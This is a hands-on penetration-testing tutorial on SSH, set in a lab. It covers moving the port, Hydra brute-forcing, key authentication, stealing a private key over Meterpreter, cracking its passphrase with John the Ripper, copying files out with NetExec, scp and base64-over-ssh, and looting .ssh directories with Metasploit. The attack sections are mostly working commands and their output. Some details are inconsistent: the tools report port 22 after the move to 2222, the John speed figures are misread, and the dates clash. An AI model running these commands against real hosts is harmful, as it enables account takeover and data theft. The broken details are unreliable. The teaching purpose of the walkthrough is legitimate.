Sooner or later every administrator considers moving SSH off port 22. The reasoning is that automated scanners and botnets sweep the internet for port 22 continuously — tens of thousands of attempts a day on a public address is unremarkable — and that a service on a non-standard port will simply not be found by that noise. Before adopting the practice it is worth understanding precisely what it buys and what it does not, and the best way to understand it is to do the move and then attack it again.

The change is made in the server configuration file, `/etc/ssh/sshd_config`. The file is a plain text file of `Keyword value` pairs, most of which are commented out with `#` and show the default that applies when the line is absent.

```bash
pentest@ubuntu-lab:~$ cd /etc/ssh
pentest@ubuntu-lab:/etc/ssh$ ls
moduli  ssh_config  ssh_config.d  ssh_host_ecdsa_key  ssh_host_ecdsa_key.pub
ssh_host_ed25519_key  ssh_host_ed25519_key.pub  ssh_host_rsa_key
ssh_host_rsa_key.pub  sshd_config  sshd_config.d
pentest@ubuntu-lab:/etc/ssh$ grep -n "^#Port\|^Port\|^#PasswordAuthentication\|^PasswordAuthentication" sshd_config
13:#Port 22
58:#PasswordAuthentication yes
pentest@ubuntu-lab:/etc/ssh$ sudo nano sshd_config
```

The `grep` output tells the whole story before the editor even opens. `#Port 22` on line 13 is a comment: it documents the compiled-in default of 22, and the daemon is indeed listening on 22 because nothing has overridden it. `#PasswordAuthentication yes` on line 58 does the same for password authentication — and again, because the line is commented, the package default governs, and that default is to accept passwords. Editing the file means turning the first of those into an active directive and, later in section 7, turning the second into an explicit `no`.

Inside `nano` you would delete the leading `#` and the space, and change the port number, leaving the line as:

```
Port 2222
```

The `nano` shortcuts are worth committing to memory if you are new to the editor: `Ctrl+W` searches for text (the fastest way to find line 58 in a file of 130 lines), `Ctrl+O` followed by Enter saves, `Ctrl+X` exits, and the bottom of the screen always shows the current menu. Once the file is saved, the daemon has to be told to re-read it, and on Ubuntu the service is managed by systemd:

```bash
pentest@ubuntu-lab:/etc/ssh$ sudo systemctl restart ssh
pentest@ubuntu-lab:/etc/ssh$ ss -tlnp | grep sshd
LISTEN 0      128          0.0.0.0:2222      0.0.0.0:*    users:(("sshd",pid=2317,fd=3))
LISTEN 0      128             [::]:2222         [::]:*    users:(("sshd",pid=2317,fd=4))
```

Note that the process ID has changed from 812 to 2317, which confirms that the old daemon really was replaced rather than merely reloaded, and that port 22 no longer appears anywhere in the listening sockets. A `restart` drops every existing session, so on a remote production host the safe sequence is to validate the new configuration first (`sudo sshd -t`), keep the current session open as a fallback, and restart from a console or a second connection. A configuration error combined with a restart on the only session you have is the classic way to lock yourself out of a server.

From the attacker's side the change is almost invisible. The same version scan, pointed at the new port, returns the same information:

```bash
root@kali:~# nmap -sV -p 2222 192.168.1.9
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:21 UTC
Nmap scan report for 192.168.1.9
Host is up (0.00051s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:0C:29:1B:2C:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

And the credential attack works exactly as before, with the single addition of the `-s 2222` flag to tell Hydra which port to use:

```bash
root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:22:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:4/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.1.9:2222/
[2222][ssh] host: 192.168.1.9   login: pentest   password: 123
[STATUS] attack finished for 192.168.1.9 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:22:49
```

The lesson is now demonstrated rather than asserted. Port obfuscation reduces *noise* and nothing else. It defeats scanners that only check a fixed list of common ports, which is a real and measurable benefit on an internet-facing host — the volume of junk in the authentication log drops dramatically. It does nothing whatsoever against an attacker who enumerates every port, and a full-range scan (`nmap -p- 192.168.1.9`) finds the service in a couple of minutes, as does a quick sweep with `masscan` or a TCP connect scan of the /24. Because the underlying weakness — a guessed password accepted over a network — is untouched, moving the port is best described as a filter against automation rather than a control. It is a reasonable complement to a real control, an unacceptable substitute for one, and it costs the organisation a small amount of documentation and firewall complexity forever.

---

## 7. Key-based authentication and disabling passwords

The correct fix for everything in sections 4 to 6 is to stop accepting passwords over the network. Public-key authentication is fundamentally stronger than a password for one simple reason: **the private key never travels**. The client proves possession of the key by signing a challenge, the server verifies the signature against a public key it already trusts, and an attacker who records the entire session learns nothing that can be replayed. Equally importantly for our purposes, there is no password prompt to guess, so every online password-guessing attack against the service becomes impossible rather than merely difficult.

This section sets up key-based authentication on the target, then disables password authentication and verifies the change with the same tool we used during reconnaissance.

### 7.1 Generating a key pair with `ssh-keygen`

The client-side tool for making a key pair is `ssh-keygen`. Run with no arguments it asks three questions — where to save the key, what passphrase to protect it with, and (historically) what key type and size to use. The default location is `~/.ssh/id_ed25519` (older versions default to `id_rsa`) and the pair consists of a private key file, which must never leave the machine, and a public key file with a `.pub` suffix, which is designed to be copied anywhere.

```bash
pentest@ubuntu-lab:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/pentest/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/pentest/.ssh/id_rsa
Your public key has been saved in /home/pentest/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:nfPUs+K0kdYNbSGUP3B6Dwa6u1kzz+KoyA52EmXpVms pentest@ubuntu-lab
The key's randomart image is:
+---[RSA 3072]----+
|             ..  |
|       .    oo . |
|      + .  . o=. |
|     + . o.. o+=.|
|    . o E +...=.=|
|     o .  .+ o *.|
|    + .    .@ o .|
|   . = .  .B.O   |
|     .+ ..+o+.o  |
+----[SHA256]-----+
pentest@ubuntu-lab:~$ ls -l .ssh
total 8
-rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
-rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
```

Three things in this transcript are worth pausing on. The passphrase prompt is the most important: pressing Enter twice would create an *unencrypted* private key, which is a file that gives whoever steals it immediate access with no further obstacle. Typing a passphrase encrypts the key on disk, so a stolen key file is useless without the passphrase — and as section 8 shows, the strength of that passphrase becomes the entire security of the key. The default key type on a modern OpenSSH is Ed25519, which produces dramatically smaller files than RSA for an equivalent security level (roughly 400 bytes of private key against 2,600 for RSA-3072); the transcript above shows a system configured to default to RSA 3072, which is why the sizes differ from the Ed25519 figures. Either is acceptable; what matters is that the key is encrypted.

The second detail is the *randomart image*, the little box of ASCII art. It is not decoration: it is a visual hash of the key fingerprint, and comparing the picture between two people who believe they hold the same key is far easier for a human than comparing a 43-character Base64 string. The `SHA256:` fingerprint printed above it is the machine-comparable form, and that is the string to check when verifying a server or a key out of band.

The third detail is the file permissions, which are enforced rather than suggested. The private key is created `0600` (read and write for the owner only) and the public key `0644`. Section 7.4 explains why the SSH client refuses to use a private key with looser permissions, and it is one of the few cases in Linux where the system will actively stop you from doing something insecure.

### 7.2 Installing the public key in `authorized_keys`

Trusting the key is a second, separate step performed on the *server*: the public key must be appended to the `~/.ssh/authorized_keys` file of the account that should be allowed to log in with it. That file is a plain list of public keys, one per line, and every key in it is a permanent promise that whoever holds the matching private key may log in as this user.

```bash
pentest@ubuntu-lab:~$ cd .ssh
pentest@ubuntu-lab:~/.ssh$ ls -la
total 12
drwx------ 2 pentest pentest 4096 Jan 11 10:25 .
drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
-rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
-rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
pentest@ubuntu-lab:~/.ssh$ cat id_rsa.pub >> authorized_keys
pentest@ubuntu-lab:~/.ssh$ ls -l
total 16
-rw------- 1 pentest pentest  572 Jan 11 10:26 authorized_keys
-rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
-rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
pentest@ubuntu-lab:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7VQ0mTf3xYq1r8pL2kZ9dN4sW6hXaE5jC0oB7uM1vR3tQ... pentest@ubuntu-lab
```

The redirection operator matters here and is worth getting right. `>>` *appends*, which preserves any keys that are already trusted; `>` *truncates* and would silently remove every other key from the file, locking out every user who relied on them. On a fresh lab machine the file does not exist yet, so either form works — but the long-form habit of appending is the difference between installing a key and accidentally revoking access for the whole team. The permissions on the resulting file are also constrained: OpenSSH will refuse to use `authorized_keys` if it is group- or world-writable, on the reasonable grounds that anyone who can write to the file can authorise a new key and become that user.

Note the directory permissions shown by `ls -la`: `~/.ssh` is `0700` and belongs to the user. The whole trust chain is therefore: the directory must not be writable by others, the `authorized_keys` file must not be writable by others, and only then is the key inside it believed. That chain is also a well-known privilege-escalation path when a home directory is misconfigured, because a user who can write into another user's `.ssh` directory can grant themselves that user's identity.

### 7.3 Disabling password authentication

Now that a working key exists, the password entry point can be closed. The directive lives in `sshd_config`, where the packaged default is present but commented:

```
#PasswordAuthentication yes
```

It must be changed to an active `no`:

```
PasswordAuthentication no
```

On a modern Ubuntu the effective configuration is assembled from `sshd_config` plus every file in `/etc/ssh/sshd_config.d/`, and one of those drop-in files may set `PasswordAuthentication yes` with a higher precedence, because in OpenSSH the *first* value found for a keyword wins. That is why the reliable way to check the effective settings is not to read the files but to ask the daemon:

```bash
pentest@ubuntu-lab:~/.ssh$ sudo sshd -T | grep -i "passwordauthentication\|kbdinteractive\|permitrootlogin"
passwordauthentication no
kbdinteractiveauthentication yes
permitrootlogin prohibit-password
```

`sshd -T` dumps the configuration the daemon actually parsed, which is the only answer that counts. Here it confirms `passwordauthentication no` — while also revealing a second, subtler point: `kbdinteractiveauthentication yes` is *also* a way to offer a password prompt, because keyboard-interactive authentication can be wired to PAM and therefore to the same password database. If the goal is to remove password logins entirely, that directive usually has to be turned off as well. The same output confirms `permitrootlogin prohibit-password`, the Ubuntu default that allows root to log in with a key but never with a password.

After the edit, the daemon is reloaded and the change verified from outside with the nmap script from section 3:

```bash
pentest@ubuntu-lab:~/.ssh$ sudo systemctl reload ssh
root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 2222 192.168.1.9
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:29 UTC
Nmap scan report for 192.168.1.9
Host is up (0.00044s latency).

PORT     STATE SERVICE REASON
2222/tcp open  ssh     syn-ack
| ssh-auth-methods:
|   Supported authentication methods:
|_    publickey

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

The `password` line is gone. That single missing line is the entire defeat of the attack chain from section 4: Hydra has nothing to guess, and it will report failures for every credential pair because the server rejects the *method* before it ever looks at the password. Running it to see that failure is a worthwhile exercise, because the output is unmistakably different from the earlier run:

```bash
root@kali:~# hydra -L users.txt -P pass.txt -s 2222 192.168.1.9 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:31:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:4/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.1.9:2222/
[ERROR] target ssh://192.168.1.9:2222/ does not support password authentication.
1 of 1 target successfully completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:31:07
```

Hydra's own error message states the conclusion better than any report could: *does not support password authentication*. Note that this does not make the server immune to attack — it moves the battle to key management, which is what the next two sections exploit.

### 7.4 Logging in with the private key

With the key installed, logins are made by pointing the client at the private key file with `-i`. The key file, however, has to satisfy the client's permission requirements, and violating them produces one of the most-quoted error messages in SSH administration.

```bash
meterpreter > download /home/pentest/.ssh/id_rsa /root/id_rsa
[*] Downloading: /home/pentest/.ssh/id_rsa -> /root/id_rsa
[*] Downloaded 2.59 KiB of 2.59 KiB (100.0%): /home/pentest/.ssh/id_rsa -> /root/id_rsa
[*] download   : /home/pentest/.ssh/id_rsa -> /root/id_rsa
meterpreter > background
[*] Backgrounding session 1...
root@kali:~# ls -l id_rsa
-rw-r--r-- 1 root root 2655 Jan 11 10:34 id_rsa
root@kali:~# ssh -i id_rsa pentest@192.168.1.9
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
pentest@192.168.1.9: Permission denied (publickey).
root@kali:~# chmod 600 id_rsa
root@kali:~# ssh -i id_rsa pentest@192.168.1.9
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
Last login: Thu Jan 11 10:22:13 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

Before reading the details, note *how* the key left the target. It was pulled over the Meterpreter session from section 5.3, which is still alive: Meterpreter is not an SSH session, so disabling password authentication on the daemon has no effect whatsoever on an attacker who already has a foothold. That sequencing is the whole point of this exercise. The victim hardens the service on Monday, and the attacker who stole a key on Friday still walks in on Tuesday. The stolen file is the long-term credential, which is also why key theft is so much more serious than password theft: a password can be changed in seconds, whereas a key has to be revoked from every `authorized_keys` file where it was installed, many of which may be unknown to the administrator.

The file arrived as `0644`, which is readable by every account on the machine, and the client refused to use it — not because it could not read the file, but because a private key that other users can read is presumed compromised. Because password authentication has already been disabled in section 7.3, the failure here is total: there is no fallback method left, and the server answers with `Permission denied (publickey)`. That is worth pausing on, because before hardening the same mistake was invisible — the client quietly fell back to the password prompt and the login *succeeded* by the weakest available method, leaving the operator convinced the key was working. Because the key is passphrase-protected, the corrected attempt also asks for the passphrase, and only then is the session established.

The requirement is stricter than "not world-readable": the file should be `0600` and owned by the user, and the client also checks that the *directory* is not writable by others, because a writable directory would let another user swap in a different key file. On a real engagement the same checks appear in reverse: when a private key is found with permissions allowing other users to read it, that is worth reporting as a finding in its own right, since a local user on the host could lift the key and use it to reach every host that trusts it.

---

## 8. Cracking passphrase-protected private keys

Disabling password authentication was the correct defensive move, and it removes the attack surface that section 4 exploited. But it does not make stolen keys safe, because a private key file on an attacker's disk can be attacked *offline*: no server, no rate limit, no log, no lockout, and no time pressure. Millions of candidate passphrases can be tested against the file at the attacker's leisure. The only thing standing between a stolen key and the account it protects is the strength of the passphrase that encrypts it.

The demonstration runs the whole attack in four commands on the attacker machine, using the key stolen in section 7.4 and an ordinary wordlist.

### 8.1 Converting the key with `ssh2john`

John the Ripper cannot read an OpenSSH private key file directly; it works with its own hash formats. `ssh2john` — a small converter that ships alongside John, usually installed as `ssh2john`, `ssh2john.py` or `ssh2john.py` in `/usr/share/john/`, depending on the distribution — reads a private key and emits the encrypted key material in a format John understands.

```bash
root@kali:~# ssh2john id_rsa > sshhash
root@kali:~# cat sshhash
id_rsa:$sshng$6$16$a4d9f2b8c1e77d0ef3a5b91c2d6f8a30$2655$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010a4d9f2b8c1e77d0ef3a5b91c2d6f8a300000...$16$47
```

The output is one line, and it is worth reading field by field because the structure tells you what John will have to do. The part before the colon is the *label* — the key filename with an index, so `id_rsa`. Then `$sshng$` marks the hash type. The `6` is the *KDF and cipher identifier*, and 6 means `bcrypt-pbkdf` key derivation with an `aes256-ctr` cipher, which is the modern default for OpenSSH-format keys. The next field, `16`, is the salt length in bytes, followed by the salt itself in hexadecimal; the long hexadecimal blob is the encrypted key material; and the two trailing numbers are the bcrypt `rounds` value and the offset at which the ciphertext begins.

Two things follow from this structure. First, an unencrypted key produces no hash line at all — `ssh2john` prints a message to standard error saying the key has no password and exits, which is a useful check to run against any keys found on a host you are assessing. Second, the presence of `bcrypt-pbkdf` is good news for the defender: bcrypt is deliberately expensive to compute, so each candidate passphrase costs far more than a plain hash would. As we are about to see, "expensive" is a relative term.

### 8.2 Cracking with John the Ripper

The wordlist used here is `rockyou.txt`, a collection of roughly fourteen million real passwords that leaked from a breach in 2009 and has been the standard first wordlist in security testing ever since, so much so that on Debian-family systems it is installed as a compressed file at `/usr/share/wordlists/rockyou.txt.gz` and has to be decompressed once before use.

```bash
root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz
root@kali:~# john -w=/usr/share/wordlists/rockyou.txt sshhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123              (id_rsa)
1g 0:00:01:32 DONE (2024-01-11 10:41:07) 0.01086g/s 121.4p/s 121.4c/s 121.4C/s use wl mode
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The `Loaded 1 password hash` line names the detected format — `SSH, SSH private key` — and the bracketed list of KDF and cipher variants the format understands. The two `Cost` lines are the interesting part and they correspond exactly to the identifiers we decoded from the hash. `Cost 1` is the KDF/cipher selector, reported as `2`, which is John's internal code for the `bcrypt-pbkdf/AES` family; `Cost 2` is the iteration count, reported as `16`. Together they say: this key is protected with the strongest of the three KDF options John knows for SSH keys, the same family OpenSSH uses by default. That is a genuine mitigation, and it is why `Will run 4 OpenMP threads` matters — John is parallelising across CPU cores to compensate.

Now the punchline. The recovered passphrase is `123`, and the `1g 0:00:01:32` field means it took one minute and thirty-two seconds. The `g/s` figure — 0.01086 guesses per second — quantifies the cost of the bcrypt KDF: only about one passphrase every ninety seconds per core, so a four-core machine tests roughly 120 candidates per second against this key. Against a weak hash, John would be testing millions per second. That is the defence working exactly as designed, and it is why the defender's instinct should be to compare the *search space* rather than the speed: the attacker gets about 120 guesses per second, but only from a wordlist that contains the passphrase. Three digits have a thousand combinations and would fall in seconds; a five-character lowercase password has ten million and would take about a day; a twenty-character random passphrase has more combinations than there are atoms in the observable universe, and the bcrypt cost makes even a dictionary of all human-chosen passwords a slow business.

The `Use the "--show" option` line is John's standing reminder that the cracked passwords are stored in its pot file (`~/.john/john.pot`) and can be listed later without re-cracking:

```bash
root@kali:~# john --show sshhash
id_rsa:123

1 password hash cracked, 0 left
root@kali:~# ssh -i id_rsa pentest@192.168.1.9
Enter passphrase for key 'id_rsa': 
Last login: Thu Jan 11 10:36:44 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

The narrative arc of this section is the one worth remembering, because it is counter-intuitive. The administrator did everything the checklist says: generated a modern key, protected it with a passphrase, and disabled password authentication entirely. And yet the attacker still owns the account, because the passphrase was a wordlist entry. The passphrase is not a formality to be completed as quickly as possible; for a key that is authorised on a production host, it *is* the credential, and it deserves the same treatment as a password on a root account — twenty random characters, generated by a password manager, never reused, and rotated if the key file is ever exposed.

---

## 9. Data exfiltration — SCP and NetExec file operations

An authenticated SSH account is not just a shell; it is also a file-transfer channel. Note also *which* credential is used from here on: password authentication was disabled in section 7.3, so every command in the remainder of this guide authenticates with the stolen private key from section 7.4 and the passphrase recovered in section 8. That is not a narrative convenience — it is the reality of an intrusion that keeps working after the victim responds. Three separate mechanisms ride on the same connection and the same credentials — the SCP protocol, the SFTP subsystem, and plain redirection through a command session — which means that a single set of stolen credentials covers reading data, writing data and moving tools onto a host. This section demonstrates the two most convenient paths, and explains why the ability to transfer files silently changes the size of the incident.

### 9.1 Uploading with NetExec `--put-file`

NetExec's `--put-file` takes a local path and a remote path, authenticates, and transfers the file over SFTP, printing a line for the transfer and another for the result.

```bash
root@kali:~# echo "staging marker from the assessment team" > file.txt
root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --put-file file.txt /tmp/file.txt
[*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
[+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
[*] SSH         192.168.1.9    22     192.168.1.9     Copying "file.txt" to "/tmp/file.txt"
[+] SSH         192.168.1.9    22     192.168.1.9     Created file "file.txt" on "/tmp/file.txt"
```

One detail of that invocation is easy to miss: when `--key-file` is supplied, NetExec reinterprets the `-p` argument as the *passphrase* of the private key rather than an account password, which is why `123` still appears on the command line even though password authentication is disabled. The success line confirms what happened by appending `(keyfile: key)` to the credential before reporting the platform.

The two lines after the authentication marker follow a pattern worth recognising: `Copying "source" to "destination"` is informational, printed before the transfer, and `Created file ...` is the success confirmation printed after it. If the write fails — typically because the destination directory is not writable by the account, or does not exist — you get a `[-]` line carrying the underlying error instead, which is far more useful than a silent failure.

The demonstration transfers a harmless text file, but the technique is the one an operator uses to move tools into a network and the one a defender should worry about: a small binary, a script, or a tunnelling client can be dropped anywhere the account can write, which on this host means anywhere at all, because `pentest` is a member of `sudo`. Uploads of this kind are also a well-known detection opportunity, since the file lands on disk, may carry a distinctive name, and the transfer itself generates SFTP subsystem activity in the SSH server log where ordinary shell sessions would be logged differently.

### 9.2 Downloading with NetExec `--get-file`

The reverse operation takes a remote path and a local destination filename, and the messages mirror the upload exactly.

```bash
root@kali:~# nxc ssh 192.168.1.9 -u pentest --key-file key -p 123 --get-file /etc/passwd passwd
[*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
[+] SSH         192.168.1.9    22     192.168.1.9     pentest:123 (keyfile: key)  Linux
[*] SSH         192.168.1.9    22     192.168.1.9     Copying "/etc/passwd" to "passwd"
[+] SSH         192.168.1.9    22     192.168.1.9     File "/etc/passwd" was downloaded to "passwd"
root@kali:~# tail -3 passwd
pentest:x:1001:1001::/home/pentest:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

`/etc/passwd` is world-readable on every Unix system, so its transfer here is not an exploit — it is *intelligence*. The file lists every local account with its user ID, group ID, home directory and login shell, which turns into a target list for the credential attacks in section 4. The `x` in the password field shows that the real hashes live in `/etc/shadow`, which is readable only by root; exfiltrating *that* file would require the attacker to escalate first, or to use a technique such as `john` against a copy obtained while root. The lesson for defenders is that even a "nothing to see here" file like `/etc/passwd` leaks account structure, and the lesson for testers is that an inventory of local users is a prerequisite for spraying.

### 9.3 Transferring with SCP

SCP is the oldest and most familiar of the transfer mechanisms, and it is invoked exactly like `cp` except that the remote side is written as `user@host:path`. It authenticates with whatever the SSH client can use — a password or a key — and the whole transfer is encrypted.

```bash
root@kali:~# scp -i key file.txt pentest@192.168.1.9:/home/pentest/
Enter passphrase for key 'key': 
file.txt                               100%   39     0.4KB/s   00:00    
root@kali:~# scp -i key pentest@192.168.1.9:/etc/passwd ./passwd-scp
Enter passphrase for key 'key': 
passwd                                 100% 1909     1.9MB/s   00:00    
```

The direction is determined entirely by where the `user@host:` prefix sits. With it on the destination, `scp file.txt pentest@192.168.1.9:/home/pentest/` *uploads*; with it on the source, `scp pentest@192.168.1.9:/etc/passwd ./` *downloads*. The progress line shows the filename, the percentage complete and the transfer rate, and it disappears on completion — which is why the second command renames the destination to `./passwd-scp` rather than `./passwd`, to avoid overwriting the copy obtained with NetExec a moment earlier.

A few options matter in practice. `-r` copies a directory tree, which is how an operator mirrors a whole home directory in one command. `-i key` selects a specific private key instead of relying on an agent or a default key — the form used above, and the form you are forced into once password authentication has been disabled. `-P 2222` selects a non-standard port — note the capital `P`, which is different from the lowercase `p` used for file permissions by `scp`, a documented inconsistency that has confused everyone at least once. And `-C` compresses the stream in transit, which is worth having when pulling a large database dump across a slow link.

Two notes on the modern state of SCP are worth including for completeness. Since OpenSSH 9.0 the client defaults to speaking the SFTP protocol internally (the `-O` flag restores the legacy protocol), and `rsync -avz -e ssh` is generally a better tool for anything larger than a handful of files because it can resume a partial transfer and only sends the differences. Both use the same credentials and the same server-side permissions, so from an assessment point of view they are interchangeable.

### 9.4 Doing the same thing by hand

The most basic transfer method needs no client features at all: redirection through a command session. Printing a file with `cat` sends its contents down the SSH channel, and the local shell can capture that into a file.

```bash
root@kali:~# ssh pentest@192.168.1.9 'cat /etc/hostname'
ubuntu-lab
root@kali:~# ssh pentest@192.168.1.9 'base64 /etc/passwd' | base64 -d > passwd-manual
root@kali:~# wc -l passwd-manual
47 passwd-manual
root@kali:~# ssh pentest@192.168.1.9 'cat > /tmp/note.txt' <<'EOF'
checking whether an upload works over a plain SSH session
EOF
root@kali:~# ssh pentest@192.168.1.9 'cat /tmp/note.txt'
checking whether an upload works over a plain SSH session
```

Three separate tricks appear in those four commands. `cat /etc/hostname` shows the simplest possible case, useful when the file is one line long. `base64` wrapping a file handles binary data and files that contain terminal control characters, which would otherwise corrupt the copy — the encode happens remotely, and the decode happens locally after the pipe. And the here-document form sends local stdin to the remote `cat`, which writes it to a file, giving a hand-rolled upload. The reason this matters is that it works through the plainest SSH session there is, with no SFTP subsystem, no client-side file-transfer tooling and no unusual daemon configuration — making it useful when a restricted server refuses to offer the subsystem, and worth knowing about from the defensive side, where a session that only ever runs `cat` and `base64` is doing something with data rather than administering a host.

The common thread through all four subsections is that the ability to run as `pentest` is the ability to move data in both directions. A defensive review should therefore never treat "SSH access" as a small permission: it carries, by default, a shell, a file transfer mechanism, a compression utility, and — as the next section shows — an attacker's automated way of finding exactly the files worth taking.

---

## 10. Post-exploitation — harvesting SSH credentials

Everything we have done by hand so far — find the key, copy it out, crack the passphrase — can be reduced to two commands once a Meterpreter session exists. The post-exploitation module `post/multi/gather/ssh_creds` walks every user's home directory on the compromised host, collects the contents of each `.ssh` directory it can read, and stores the results in the attacker's loot directory. Its value is not that it does anything a human could not; it is that it does it in seconds, across every account on the machine, before anyone notices.

```bash
msf6 > use post/multi/gather/ssh_creds
msf6 post(multi/gather/ssh_creds) > set session 1
session => 1
msf6 post(multi/gather/ssh_creds) > run

[*] Finding .ssh directories
[*] Looting 1 .ssh directories
[*] Looting /home/pentest/.ssh directory
[+] Downloaded /home/pentest/.ssh/authorized_keys -> /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.authorized_keys_114822.txt
[+] Downloaded /home/pentest/.ssh/id_rsa -> /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt
[+] Downloaded /home/pentest/.ssh/id_rsa.pub -> /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa.pub_115931.txt
[*] Post module execution completed
```

Reading the transcript in order: `Finding .ssh directories` is the module enumerating home directories from the session, `Looting 1 .ssh directories` reports how many it found, and `Looting /home/pentest/.ssh directory` names each one as it is processed. The `[+]` lines are the actual loot, and the paths on the right are the important part — every artefact is written into `/root/.msf4/loot/`, Metasploit's local evidence store, with a filename built from the timestamp, the target address, the file type and a random identifier. That naming scheme is deliberately verbose so that a tester who runs the module against fifty hosts can still tell which key came from which machine weeks later, and so that the report can cite a traceable artefact.

Three files were recovered from one account, and each one is useful in a different way. `authorized_keys` is the interesting one for lateral movement, because it names every public key that is currently trusted for that account; an operator who recognises a key from one of those comments has just found a host-to-host trust relationship to follow. `id_rsa.pub` is only marginally useful on its own. `id_rsa` is the prize: it is the private key of the account, it is authorised everywhere that key was deployed, and — as section 8 demonstrated — a weak passphrase makes it immediately usable.

The module illustrates a broader post-exploitation truth: the highest-value objects on a Linux host are hidden in plain sight in home directories that no perimeter control protects. A defender who reviews firewall rules and patch levels but never audits `~/.ssh` directories is leaving the equivalent of a spare set of keys under the doormat. The countermeasures are straightforward once seen: inventory the keys on every host, remove entries for accounts that no longer need access, protect private keys with strong passphrases, and consider whether automation accounts need private keys at all when a jump host or a short-lived certificate would do.

### 10.1 Using the harvested private key

Turning the loot back into an authenticated session is a two-command affair.

```bash
root@kali:~# mv /root/.msf4/loot/20260111104211_default_192.168.1.9_ssh.id_rsa_115476.txt key
root@kali:~# chmod 600 key
root@kali:~# ssh -i key pentest@192.168.1.9
Enter passphrase for key 'key': 
Last login: Thu Jan 11 10:44:52 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

The rename is cosmetic but practical: the loot filename is unique and unambiguous, which is exactly what you want in a report and exactly what you do not want to type repeatedly at a shell. The `chmod 600` satisfies the client's permission requirement from section 7.4 — note that the loot directory never guaranteed it — and the login then prompts for the passphrase that section 8 recovered. The important observation is that this session uses **no password at all**: password authentication is disabled, the account's password may as well not exist, and yet the attacker is inside, because the key is a second, independent credential that the hardening never touched. That is what makes key material worth hunting for, and it is why revoking a compromised key is the first action of any incident response on an SSH-accessible host.

---

## 11. Local port forwarding — reaching internal services

Suppose the engagement has moved past the initial shell and the brief is to see what else the host is running. A quick look at the listening sockets on the target answers the question immediately, and the answer is usually more interesting than the port we came in through.

```bash
pentest@ubuntu-lab:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
